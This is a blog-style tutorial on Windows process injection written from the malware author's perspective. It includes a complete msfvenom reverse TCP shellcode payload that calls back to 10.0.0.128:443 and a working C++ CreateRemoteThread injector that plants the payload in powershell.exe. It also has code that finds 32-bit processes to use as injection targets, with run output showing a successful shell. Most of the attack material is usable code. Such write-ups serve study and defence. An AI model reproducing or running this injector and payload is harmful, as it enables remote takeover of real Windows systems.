---
layout: post
title:  "Process Injection Techniques"
date:   2023-09-12 00:00:00 +0000
categories: malware
---

In this entry, we will dive into Windows process injection techniques demonstrated by malware. Malware authors deploy process injection to run malicious code under another process.

### 1. Payload & Compiling
Many malware authors opt for 32-bit malware, because of it's backwards compatibility with 64-bit systems. 

+ 32-bit processes can run on 64-bit systems.
+ 64-bit processes cannot run on 32-bit systems.

Since most malwares are 32-bit. All code below will be compiled in `x86 (32-bit)`, with the command `g++.exe <input.cpp> -o <output.exe> --std=c++20 -static`.

The issue with writing 32-bit malware, is that it faces difficulties working with the memory of 64-bit processes. We will understand this better later.

A simple reverse TCP shell will be used. The shellcode was generated with the following command - `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c`. I will exclude the payload code in below examples due to its obstruction.

{% highlight cpp %}

unsigned char payload[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x00\x00\x80\x68"
"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";

{% endhighlight %}

<br>
### 2. CreateRemoteThread Injection
CreateRemoteThread is the most basic form of process injection. In essence, it performs the following calls,
+ `OpenProcess()` to get a handle to the victim process.
+ `VirtualAllocEx()` to allocate a new memory page in the victim process.
+ `WriteProcessMemory()` to inject the shellcode into the new memory page.
+ `CreateRemoteThread()` to start the shellcode, in a new thread, in the new memory page.


<br>
#### 2.1. Where to Inject?
The shellcode cannot be injected into any process of choice. Take this example.

{% highlight cpp %}

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int main() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE process_handle;
    PVOID remote_buffer;
    HANDLE remote_thread;

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    while (Process32Next(snapshot, &processEntry)) {
          
        if (strcmp(processEntry.szExeFile, "powershell.exe") == 0) {
            printf("Found powershell.exe\n");

            process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (int) processEntry.th32ProcessID);
            std::cout << "HANDLE: " << process_handle << std::endl;

            remote_buffer = VirtualAllocEx(process_handle, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
            std::cout << "Remote Buffer: " << remote_buffer << std::endl;

            bool written = WriteProcessMemory(process_handle, remote_buffer, payload, sizeof(payload), NULL);
            std::cout << "WriteProcessMemory: " << written << std::endl;

            remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE) remote_buffer, NULL, 0, NULL);
            std::cout << "Remote Thread: " << remote_thread << std::endl;

            CloseHandle(process_handle);
            break;
        }
    };

    CloseHandle(snapshot);
    return 0;
}

{% endhighlight %}

<br>
Let's run the code and dissect the output. We notice that `CreateRemoteThread` fails and returns a NULL. If we inspect `GetLastError`, we get `0x5 (ERROR_ACCESS_DENIED)`. But why?

{% highlight powershell %}

C:\Users\root\Desktop
λ injector.exe
Found powershell.exe
Calc HANDLE: 0x104
Remote Buffer: 0xfe0000
WriteProcessMemory: 1
Remote Thread: 0

{% endhighlight %}

<br>
#### 2.2. 32-bit or 64-bit?
The above example fails, because `CreateRemoteThread` cannot be called from a 32-bit process, to start a thread in a 64-bit process. As stated earlier, this is one of the limitations of 32-bit malware.

Now, let's launch a 32-bit powershell.exe process, and run our malware. 

![powershell32](/assets/post_assets/process-injection-techniques/powershell32.png)

<br>
Successfully obtained a handle on the remote thread.

{% highlight powershell%}
C:\Users\root\Desktop
λ injector.exe
Found powershell.exe
HANDLE: 0x118
Remote Buffer: 0x6ac0000
WriteProcessMemory: 1
Remote Thread: 0x12c
{% endhighlight %}

<br>
Popped a shell. Success!

![shell1](/assets/post_assets/process-injection-techniques/shell1.png)


<br>
#### 2.3. Identifying 32-bit processes
As we learnt above, 32-bit processes must find other 32-bit processes to inject into. 

The below code enumerates all processes in the system with `CreateToolhelp32Snapshot`, then identifies those that are 32-bit.

{% highlight cpp %}
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int main(int argc, char** argv) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    std::string filepath = argv[0];
    int index = filepath.find_last_of("\\/");
    std::string filename = filepath.substr(index + 1);

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    while (Process32Next(snapshot, &processEntry)) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processEntry.th32ProcessID);
        
        BOOL isWow64 = FALSE;
        IsWow64Process(hProcess, &isWow64);
        if (isWow64 && (strcmp(processEntry.szExeFile, filename.c_str()) != 0)) {
            std::cout << "Found 32-bit process: " << processEntry.szExeFile << std::endl;
            // malicious activity 
            break;
        }
    };
}
{% endhighlight %}

<br>
Here's the output. The script successfully identified the Powershell (x86) instance running.

{% highlight powershell %}
PS C:\Users\root\Desktop\check32bit> .\check32bit.exe
Found 32-bit process: powershell.exe
{% endhighlight %}